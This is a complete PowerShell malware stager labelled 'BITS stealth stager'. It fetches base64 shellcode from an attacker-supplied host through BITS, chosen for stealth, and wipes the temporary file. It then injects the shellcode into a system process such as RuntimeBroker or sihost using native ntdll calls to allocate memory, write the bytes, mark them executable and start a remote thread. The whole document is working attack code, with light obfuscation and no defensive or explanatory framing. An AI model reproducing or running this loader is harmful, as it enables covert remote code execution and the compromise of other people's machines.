# BITS stealth stager - uses BITS for download, env vars for config
$T=[Environment]::GetEnvironmentVariable("T","Process")
$K=[Environment]::GetEnvironmentVariable("K","Process")
if(-not $T){Write-Host "Set env T=tunnel K=key";exit}

$u="https://$T/payloads/shellcode.txt"
if($K){$u+="?key=$K"}
$tmp="$env:TEMP\$(Get-Random).tmp"

# BITS download - quieter than WebClient  
$j=Start-BitsTransfer -Source $u -Destination $tmp -Asynchronous
while(($j.JobState -eq "Transferring") -or ($j.JobState -eq "Connecting")){Start-Sleep 1}
Complete-BitsTransfer $j
$b64=Get-Content $tmp -Raw
Remove-Item $tmp -Force

$n="nt"+"dll"
$sc=[Convert]::FromBase64String($b64)

# Find target
$tgt=@("RuntimeBroker","sihost","SearchHost","TextInputHost")
$pid=$null
foreach($x in $tgt){try{$pid=(Get-Process $x -EA 0)[0].Id;break}catch{}}
if(-not $pid){exit}

$code=@"
using System;using System.Runtime.InteropServices;
public class N{
[DllImport("$n")]public static extern uint NtOpenProcess(out IntPtr h,uint a,ref OA o,ref CI c);
[DllImport("$n")]public static extern uint NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,uint z,ref IntPtr s,uint t,uint p);
[DllImport("$n")]public static extern uint NtWriteVirtualMemory(IntPtr h,IntPtr b,byte[] d,uint l,out uint w);
[DllImport("$n")]public static extern uint NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref IntPtr s,uint n,out uint o);
[DllImport("$n")]public static extern uint NtCreateThreadEx(out IntPtr t,uint a,IntPtr o,IntPtr h,IntPtr s,IntPtr p,bool c,int z,int k,int r,IntPtr b);
[StructLayout(LayoutKind.Sequential)]public struct OA{public int L;public IntPtr R,N;public uint A;public IntPtr S,Q;}
[StructLayout(LayoutKind.Sequential)]public struct CI{public IntPtr P,T;}
}
"@
Add-Type $code

$h=[IntPtr]::Zero
$oa=New-Object N+OA;$oa.L=48
$ci=New-Object N+CI;$ci.P=[IntPtr]$pid
[N]::NtOpenProcess([ref]$h,0x1FFFFF,[ref]$oa,[ref]$ci)|Out-Null
if($h -eq [IntPtr]::Zero){exit}

$b=[IntPtr]::Zero;$s=[IntPtr]($sc.Length+0x1000)
[N]::NtAllocateVirtualMemory($h,[ref]$b,0,[ref]$s,0x3000,4)|Out-Null
$w=0;[N]::NtWriteVirtualMemory($h,$b,$sc,$sc.Length,[ref]$w)|Out-Null
$r=$b;$z=[IntPtr]$sc.Length;$o=0
[N]::NtProtectVirtualMemory($h,[ref]$r,[ref]$z,0x20,[ref]$o)|Out-Null
$t=[IntPtr]::Zero
[N]::NtCreateThreadEx([ref]$t,0x1FFFFF,[IntPtr]::Zero,$h,$b,[IntPtr]::Zero,$false,0,0,0,[IntPtr]::Zero)|Out-Null
